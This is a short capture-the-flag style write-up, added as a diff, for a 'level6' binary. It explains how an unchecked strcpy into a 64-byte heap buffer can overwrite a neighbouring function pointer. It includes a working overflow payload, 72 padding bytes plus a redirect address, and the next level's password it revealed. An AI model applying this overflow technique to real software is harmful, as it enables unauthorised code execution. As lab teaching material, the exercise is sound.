@@ -1,0 +1,32 @@
+level6 segfaults as soon as we launch it. If we launch it with an argument it simply prints "Nope".
+
+Taking a deeper look with gdb, we understand that the [main] executes two [malloc]s
+then a [strcpy].
+The first [malloc] is 64 bytes long. Second is 4 bytes long, and stores a pointer to another function,
+located at 0x8048468. It's a function called [m].
+Then the [strcpy] is called on argv[1] and stored in the first malloc.
+There is also a function called [n]. It directly calls a cat on the next level's .pass. [m] doesn't seem to do anything useful to us,
+as it calls [puts] with "Nope". But it is called by main.
+
+[strcpy] is not protected against buffer overflows. If the user's input is higher than 64 bytes, the strcpy will simply
+continue writing on the next bytes. So it seems we'll have to use that to our advantage to call [n].
+[n]'s address is 0x8048454.
+We'll try to make the strcpy write the address of [n] over the address of [m] stored in the pointer.
+
+First we need to find out where exactly that pointer starts.
+
+>./level6 $(python -c "print 'X'*64")
+Nope
+>./level6 $(python -c "print 'X'*68")
+Nope
+>./level6 $(python -c "print 'X'*72")
+segfaults
+>./level6 $(python -c "print 'X'*71")
+Nope
+
+It's relatively safe to assume that it is located after 72 bytes.
+
+Now let's try.
+
+>./level6 $(python -c "print 'X'*72 + '\x54\x84\x04\x08'")
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
